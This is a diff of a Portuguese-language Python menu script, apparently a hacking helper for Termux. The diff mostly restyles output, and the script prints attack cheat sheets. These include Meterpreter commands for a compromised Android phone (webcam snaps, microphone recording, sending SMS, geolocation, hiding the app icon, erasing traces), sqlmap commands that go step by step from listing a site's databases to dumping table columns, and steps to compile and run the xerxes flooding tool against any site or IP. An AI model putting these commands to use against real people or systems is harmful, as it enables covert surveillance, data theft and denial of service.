@@ -2,34 +2,48 @@
 import sys
 import time
 
-print('''\033[32m
-    _      _  _ _ _ _____  _ _ _   _ _   _ _   _ _   _ _ _ _____  _ _ _   _ _
-   | \    / ||        |   |       |   | |   | |   | |        |   |       |   |
-   |  \  /  ||_ _ _   |   |_ _ _  |_ _| |_ _| |_ _| |_ _ _   |   |_ _ _  |_ _|
-   |   \/   ||        |   |       | \   |     | \   |        |   |       | \ 
-   |        ||_ _ _   |   |_ _ _  |  \  |     |  \  |_ _ _   |   |_ _ _  |  \ 
+print('\033[36m   _ _ _ _ \033[m \033[31m°  _ _ _ \033[m')
+time.sleep(0.3)
+print('\033[36m      |    \033[m|  | S4M |      ')
+time.sleep(0.3)
+print('\033[31m      |    |  | S4M |\033[m')
+time.sleep(0.3)
+print('      |    |  | S4M |')
+time.sleep(0.3)
+print('\033[31m      |    |  |_S4M_|\033[m')
+time.sleep(0.3)
 
-                        \033[36m !!!MADE SIXX66 BY GASPAR!!! \033[0m''')
-print('\n CARREGANDO...')
+
+
+
+print('\n ... \n')
 time.sleep(0.5)
 
 
 def metasploit():
     while True:
-        print(''' 
-        [01]COMANDOS DO ANDROID
-        [02]COMANDOS DE AUDIO
-        [03]COMANDOS DA WEBCAM
-        [04]COMANDOS DA INTERFACE
-        [05]COMANDOS DO SISTEMA
-        [06]COMANDOS DE REDE
-        [07]COMANDOS DO SISTEMA DE ARQUIVOS
-        [08]COMANDOS PRINCIPAIS
-        [09]SAIR''')
-        opc = int(input('>>>: '))
+        time.sleep(0.5)
+        print('[01]COMANDOS DO ANDROID')
+        time.sleep(0.5)
+        print('[02]COMANDOS DE AUDIO')
+        time.sleep(0.5)
+        print('[03]COMANDOS DA WEBCAM')
+        time.sleep(0.5)
+        print('[04]COMANDOS DA INTERFACE')
+        time.sleep(0.5)
+        print('[05]COMANDOS DO SISTEMA')
+        time.sleep(0.5)
+        print('[06]COMANDOS DE REDE')
+        time.sleep(0.5)
+        print('[07]COMANDOS DO SISTEMA DE ARQUIVOS')
+        time.sleep(0.5)
+        print('[08]COMANDOS PRINCIPAIS')
+        time.sleep(0.5)
+        print('[09]SAIR')
+        time.sleep(0.5)
+        opc = int(input('msf: \n'))
         if opc == 1 or opc == '01':
-            print('''Comandos do Android
-    ================
+            print('''\033[7;36m COMANDOS DO ANDROID \033[m
 
         Comando          Descrição
         -------          -----------
@@ -41,42 +55,36 @@ def metasploit():
         geolocate         Obtenha a latitude atual usando a geolocalização
         hide_app_icon     Ocultar o ícone do aplicativo no iniciador
         interval_collect  Gerenciar recursos de coleta de intervalo
-        send_sms          Envia SMS da sessão de destino\033[31m |EX: send_sms -d 1122334455 -t 'gaspar3321'|\033[m
+        send_sms          Envia SMS da sessão de destino\033[7;31m |EX: send_sms -d 1122334455 -t 'gaspar3321'|\033[m
         set_audio_mode    Definir o modo de campainha
         sqlite_query      Consultar um banco de dados SQLite do armazenamento
         wakelock          Usado para manter a conexão mesmo que o android atacado entre em standby 
-        wlan_geolocate    Obtém a latitude atual usando informações de WLAN''')
+        wlan_geolocate    Obtém a latitude atual usando informações de WLAN \n''')
         elif opc == 2 or opc == '02':
-            print('''Comandos de Saída de Áudio
-    =============================
+            print('''\033[7;36m COMANDOS DE AUDIO \033[m
 
         Comando            Descrição
         -------            -----------
         reproduzir         reproduzir um arquivo de áudio no sistema de destino, nada escrito no disco
     ''')
         elif opc == 3 or opc == '03':
-            print('''comandos da webcam
-    =======================
+            print(''' \033[7;36m COMANDOS DA WEBCAM E MIC \033[m
 
         Comando         Descrição
         -------         -----------
-        record_mic      Grava áudio do microfone padrão por X segundos\033[31m |EX: record_mic -d 10|\033[m
-        webcam_chat     Iniciar um bate-papo por vídeo\033[31m  |EX: webcam_chat -i 2| \033[m
-        webcam_list     Lista de webcams  \033[31m|USADO PARA OBTER O ID DA CÂMERA|\033[m 
-        webcam_snap     Tire um instantâneo da webcam especificada\033[31m|EX: webcam_snap -i 2|\033[m
-        webcam_stream   Reproduz um fluxo de vídeo da webcam especificada  \033[31m|EX: webcam_stream -i 2\033[m
-    ''')
+        record_mic      Grava áudio do microfone padrão por X segundos\033[7;31m |EX: record_mic -d 10|\033[m
+        webcam_chat     Iniciar um bate-papo por vídeo\033[7;31m  |EX: webcam_chat -i 2| \033[m
+        webcam_list     Lista de webcams  \033[7;31m|EX: USADO PARA OBTER O ID DA CÂMERA|\033[m 
+        webcam_snap     Tire um instantâneo da webcam especificada\033[7;31m|EX: webcam_snap -i 2|\033[m
+        webcam_stream   Reproduz um fluxo de vídeo da webcam especificada  \033[7;31m|EX: webcam_stream -i 2\033[m \n''')
         elif opc == 4 or opc == '04':
-            print('''Comandos da interface do usuário
-    ===============================
+            print('''\033[7;36m COMANDO DE INTERFACE \033[m
 
         Comando              Descrição
         -------              -----------
-        screenshot      Capture uma captura de tela da área de trabalho interativa
-    ''')
+        screenshot      Capture uma captura de tela da área de trabalho interativa \n''')
         elif opc == 5 or opc == '05':
-            print(''' Comandos do sistema
-    =======================
+            print(''' \033[7;36m COMANDOS DO SISTEMA \033[m
 
         Comando           Descrição
         -------           -----------
@@ -86,22 +94,18 @@ def metasploit():
         pgrep             Filtrar processos por nome
         ps                Processos em execução da lista
         shell             Drop into a shell de comando do sistema
-        sysinfo           Obtém informações sobre o sistema remoto, como SO
-    ''')
+        sysinfo           Obtém informações sobre o sistema remoto, como SO \n''')
         elif opc == 6 or opc == '06':
-            print('''Comandos de Rede
-    ===========================
+            print('''\033[7;36m COMANDOS DE REDE \033[m
 
         Comando                Descrição
         -------                -----------
         ifconfig               interfaces de exibição ifconfig
         ipconfig               interfaces de exibição ipconfig
         portfwd                Encaminhar uma porta local para um serviço remoto
-        route                  Visualizar e modificar a tabela de roteamento
-    ''')
+        route                  Visualizar e modificar a tabela de roteamento \n''')
         elif opc == 7 or opc == '07':
-            print('''Comandos do sistema de arquivos
-    ============================
+            print('''\033[7;36m COMANDOS DO SITEMA DE ARQUIVOS \033[m
 
         Comando         Descrição
         -------         -----------
@@ -124,15 +128,16 @@ def metasploit():
         rm              Excluir o arquivo especificado
         rmdir           Remover diretório
         search          Pesquisar por arquivos
-        upload          Carregar um arquivo ou diretório
-    ''')
+        upload          Carregar um arquivo ou diretório \n''')
         elif opc == 8 or opc == '08':
-            print('''' Comando                      Descrição
+            print('''\033[7;36m COMANDOS PRINCIPAIS \033[m
+             
+        Comando                      Descrição
         -------                      -----------
         ?                            Menu de ajuda
         Background                   Backgrounds a sessão atual
-        bgkill                       Elimina rastros deixados pelo payload\033[31m|EX: bgkill -i 1\033[m
-        bglist                       Lista rastros deixados por você\033[31m|OBS: USADO JUNTO COM O bgkill\033[m1
+        bgkill                       Elimina rastros deixados pelo payload\033[7;31m|EX: bgkill -i 1\033[m
+        bglist                       Lista rastros deixados por você\033[7;31m|OBS: USADO JUNTO COM O bgkill\033[m1
         bgrun                        Executa um script meterpreter como um thread de segundo plano
         channel                      Exibe informações ou controla canais ativos
         close                        Fecha um canal
@@ -156,45 +161,51 @@ def metasploit():
         transport                    Alterar o mecanismo de transporte atual
         use                          o alias obsoleto para "load"
         uuid                         Obter o UUID para a sessão atual
-        writes                       Grava dados em um canal''')
+        writes                       Grava dados em um canal \n''')
         elif opc == 9 or opc == '09':
             menu()
 def termux():
-    print('''\n[01]COMANDOS BÁSICOS
-[02]VOLTAR''')
-    z1 = int(input('>>>: '))
+    print('[01]COMANDOS BÁSICOS')
+    time.sleep(0.5)
+    print('[02]VOLTAR')
+    z1 = int(input('\n trmx: \n'))
     if z1 == 1 or z1 == '01':
-        print('''comandos básicos do termux 
---------------------------
-comandos                        descrição
---------                        ---------
-apt update:                     Usado para baixar as informações do pacotes configurados.
-apt upgrade:                    É usado para instalar atualizações disponíveis de todos os pacotes. 
-ls:                             Usado para listar diretórios.
-termux-setup-storage:           Garante a permissão de leitura de arquivos.
-cd:                             Usado para navegar entre diretórios\033[31m|EX: cd downloads\033[m
-mv:                             Usado para mover aquivos\033[31m|EX: mv xerxes.c /$HOME\033[m
-rm:                             remove arquivos e diretórios\033[31m|EX: rm xerxes\033[m
-chmod:                          Comando que pode alterar permissões de acesso\033[31m|EX: chmod +x xerxes.c\033[m
-pwd:                            mostra o caminho completo do diretório em que você se encontra.
-cat:                            mostra o conteúdo de um arquivo binário ou texto\033[31m|EX: cat arquivo.txt\033[m
-cd.. :                          Volta ao diretório anterior.
-clear:                          limpa a tela do terminal.
-chmod 777:                      Dá permissão total ao arquivo\033[31m|EX: chmod 777 xerxes.c \033[m
-cp:                             Copia todo o conteúdo do diretório.
-kill:                           Encerra um ou mais processos em andamento.
-rm -rf:                         remove todos os arquivos e subdiretórios do diretório especificado.
-unzip:                          descompacta arquivos .zip\033[31m|EX: unzip ngrok.zip \033[m''')
+        print(''' \033[7;36m COMANDOS BÁSICOS DO TERMUX \033[m
+        
+        comandos                        descrição
+        --------                        ---------
+        apt update:                     Usado para baixar as informações do pacotes configurados.
+        apt upgrade:                    É usado para instalar atualizações disponíveis de todos os pacotes. 
+        ls:                             Usado para listar diretórios.
+        termux-setup-storage:           Garante a permissão de leitura de arquivos.
+        cd:                             Usado para navegar entre diretórios\033[7;31m|EX: cd downloads\033[m
+        mv:                             Usado para mover aquivos\033[7;31m|EX: mv xerxes.c /$HOME\033[m
+        rm:                             remove arquivos e diretórios\033[7;31m|EX: rm xerxes\033[m
+        chmod:                          Comando que pode alterar permissões de acesso\033[7;31m|EX: chmod +x xerxes.c\033[m
+        pwd:                            mostra o caminho completo do diretório em que você se encontra.
+        cat:                            mostra o conteúdo de um arquivo binário ou texto\033[7;31m|EX: cat arquivo.txt\033[m
+        cd.. :                          Volta ao diretório anterior.
+        clear:                          limpa a tela do terminal.
+        chmod 777:                      Dá permissão total ao arquivo\033[7;31m|EX: chmod 777 xerxes.c \033[m
+        cp:                             Copia todo o conteúdo do diretório.
+        kill:                           Encerra um ou mais processos em andamento.
+        rm -rf:                         remove todos os arquivos e subdiretórios do diretório especificado.
+        unzip:                          descompacta arquivos .zip\033[7;31m|EX: unzip ngrok.zip \033[m \n ''')
         termux()
     elif z1 == 2 or z1 == '02':
         menu()
 def menu():
-    print('''\n[01]METASPLOIT
-[02]SQLMAP
-[03]XERXES
-[04]COMANDOS DO TERMUX
-[05]SAIR''')
-    n = int(input('\n>>>: '))
+    print('[01]METASPLOIT')
+    time.sleep(0.5)
+    print('[02]SQLMAP')
+    time.sleep(0.5)
+    print('[03]XERXES')
+    time.sleep(0.5)
+    print('[04]COMANDOS DO TERMUX')
+    time.sleep(0.5)
+    print('[05]SAIR')
+    time.sleep(0.5)
+    n = int(input('\n mnl: \n'))
     if n == 1 or n == '01':
         metasploit()
     elif n == 2 or n == '02':
@@ -206,30 +217,33 @@ def menu():
     elif n == 5 or n == '05':
         sys.exit()
 def xerxes():
-    print('''\n[01]COMANDOS
-[02]VOLTAR''')
-    n3 = int(input('>>>: '))
+    print('\n[01]COMANDOS')
+    time.sleep(0.5)
+    print('[02]VOLTAR')
+    time.sleep(0.5)
+    n3 = int(input('\n xrxs: \n'))
     if n3 == 1 or n3 == '01':
-        print('''\n(01):| cd xerxes
-(02):| pkg install clang
-(03):| clang xerxes.c -o xerxes
-(04):| ./xerxes (\033[31m site ou ip \033[m)''')
+        print('\n(01):| cd xerxes')
+        print('(02):| pkg install clang')
+        print('(03):| clang xerxes.c -o xerxes')
+        print('(04):| ./xerxes (\033[7;31m site ou ip \033[m)')
         xerxes()
     elif n3 == 2 or n3 == '02':
         menu()
 def sql():
-    print('''\n[01]COMANDOS
-[02]VOLTAR''')
-    n1 = int(input('>>>: '))
+    print('[01]COMANDOS')
+    time.sleep(0.5)
+    print('[02]VOLTAR')
+    time.sleep(0.5)
+    n1 = int(input('\n sql: \n'))
     if n1 == 1 or n1 == '01':
-        print('''\n(01):| python2 sqlmap.py -u (\033[31m site sem parênteses \033[m) --dbs
-                \n(02):|python2 sqlmap.py -u (\033[31m site \033[m) --dbs -D (\033[31m dbs \033[m) --tables
-                \n(03):|python2 sqlmap.py -u (\033[31m site \033[m) --dbs -D (\033[31m dbs \033[m) -T (\033[31m tabela \033[m) --columns
-                \n(04):|python2 sqlmap.py -u (\033[31m site \033[m) --dbs -D (\033[31m dbs \033[m) -T (\033[31m tabela \033[m) -C (\033[31m coluna \033[m) -- dump
-                \n \033[36m   OBSERVAÇÃO: QUALQUER ERRO DE ESCRITA ALTERA DIRETAMENTE O RESULTADO!
-          OBSERVE ATENTAMENTE O SEU COMANDO ANTES DE EXECUTÁ-LO! \033[m''')
+        print('\n(01):|python2 sqlmap.py -u [\033[7;31m site sem parênteses \033[m] --dbs')
+        print('\n(02):|python2 sqlmap.py -u [\033[7;31m site \033[m] --dbs -D [\033[7;31m dbs \033[m] --tables')
+        print('\n(03):|python2 sqlmap.py -u [\033[7;31m site \033[m] --dbs -D [\033[7;31m dbs \033[m] -T [\033[7;31m tabela \033[m] --columns')
+        print('\n(04):|python2 sqlmap.py -u [\033[7;31m site \033[m] --dbs -D [\033[7;31m dbs \033[m] -T [\033[7;31m tabela \033[m] -C [\033[7;31m coluna \033[m] -- dump')
+        print('\n   \033[7;36m OBSERVAÇÃO: QUALQUER ERRO DE ESCRITA ALTERA DIRETAMENTE O RESULTADO! \033[m')
+        print('   \033[7;36m OBSERVE ATENTAMENTE O SEU COMANDO ANTES DE EXECUTÁ-LO! \033[m \n')
         sql()
     elif n1 == 2 or n1 == '02':
         menu()
 menu()
-
